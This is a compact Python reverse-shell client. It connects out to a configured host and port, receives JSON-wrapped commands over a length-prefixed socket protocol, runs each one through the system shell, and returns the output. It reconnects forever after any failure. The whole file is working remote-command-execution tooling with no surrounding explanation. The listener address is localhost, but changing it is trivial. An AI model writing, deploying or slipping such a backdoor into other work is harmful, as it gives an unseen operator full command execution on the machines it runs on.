import socket,json,subprocess,struct,time,os
ip="127.0.0.1";pt=20000;rcndly=5;dbg=1;cwd=os.path.expanduser("~")
def log(x):print(f"[DBG] {x}")if dbg else None
def send(d,ip,pt):
 try:s=socket.create_connection((ip,pt));s.sendall(struct.pack(">I",len(d))+d);s.close()
 except Exception as e:log(f"send() ERR: {e}")
def Runcmd(c):
 global cwd;log(f"Runcmd(): {c}")
 try:
  p=c.strip().split()
  if p and p[0]=="cd":
   t=os.path.abspath(os.path.join(cwd,p[1]if len(p)>1 else "~"))
   if os.path.isdir(t):cwd=t;return f"Changed directory to {cwd}"
   else:return f"No such dir: {t}"
  r=subprocess.run(c,shell=True,capture_output=True,text=True,cwd=cwd)
  return r.stdout+r.stderr
 except Exception as e:return f"Runcmd() ERR: {e}"
def handle():
 try:
  log("handle(): connecting")
  s=socket.create_connection((ip,pt))
  log("handle(): connected")
  while 1:
   time.sleep(rcndly)
   try:
    l=s.recv(4)
    if not l:log("handle(): recv length=0");break
    ln=struct.unpack(">I",l)[0]
    data=b''
    while len(data)<ln:
     c=s.recv(ln-len(data))
     if not c:log("handle(): recv chunk=0");break
     data+=c
    try:
     cmd=json.loads(data.decode())["cmd"]
     log(f"handle(): cmd={cmd}")
     out=Runcmd(cmd)
     rsp=json.dumps({"output":out}).encode()
     send(rsp,ip,pt)
    except Exception as e:log(f"handle(): JSON/cmd ERR: {e}")
   except Exception as e:log(f"handle(): inner loop ERR: {e}")
  s.close();log("handle(): socket closed")
 except Exception as e:log(f"handle(): outer ERR: {e}")
if __name__=="__main__":
 while 1:
  try:handle()
  except Exception as e:log(f"main(): loop crash: {e}");time.sleep(1)

